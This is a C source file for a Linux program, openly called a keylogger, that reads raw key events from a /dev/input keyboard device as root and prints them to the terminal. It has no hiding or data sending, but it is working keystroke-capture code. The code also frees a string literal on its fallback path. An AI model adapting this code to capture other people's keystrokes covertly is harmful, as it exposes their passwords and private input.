// Not a Keylogger, trust me
//
// This program reads keys from the keyboard buffer
// and displays them on screen.
//
// Usage: sudo ./naktm
// MUST RUN AS SUPERUSER!
// MUST SPECIFY YOUR DEVICE EVENT TO READ FROM.
// SEE COMMENTS AT THE BEGINNING OF MAIN!
//
// for extra fun, run xev from terminal
// ====================================

#include <errno.h>
#include <stdlib.h>
#include <fcntl.h>
#include <linux/input.h> 
#include <stdio.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include "keymap/keymap.h"
#include "keyboard-finder/keyboard-finder.h"

#define VERBOSE 1

int main() {

    printf("NaKtm keylogger started.\n");

    /* How to find your keyboard device if find_keyboard_device
     * is failing:
     *
     * Device info is available with the command
     * cat /proc/bus/input/devices
     * Look for the device event associated with the keyboard.
     * for example, I have two keyboards attached. One appears
     * as event3 and the other event 4. */
	char* keyboard = find_keyboard_device(VERBOSE);
	if (keyboard == NULL) {
		keyboard = "/dev/input/event3";
		printf("Automatic keyboard device detection failed.\n");
		printf("Reverting to manual keyboard device: %s\n", keyboard);	
	}

    int fd = 0; /* file descriptor */
    int rd; /* number of bytes read */
    unsigned int scancode = 0;

    /* attempt to open the keyboard file */
    if ( (fd = open(keyboard, O_RDONLY)) > 0){
        struct input_event event; /* buffer to hold reads from keyboard */
        printf("Keyboard file opened successfully! \n");

        /* infinite loop to read keystrokes from file. */
        /* read() will block until there is data to read. */
        /* attempting to read the entire input event and store it in event */
        while ( (rd = read(fd, &event, sizeof(struct input_event))) ) {
            fflush(stdout);
            if (event.type == EV_KEY)
                log_keystroke_humanformat(stdout, event);
        }

    } else {
        fprintf(stderr, "Error: Couldn't open keyboard file -- %s\n", strerror(errno));
        exit(1);
    }

	free(keyboard);
    return 0;
}
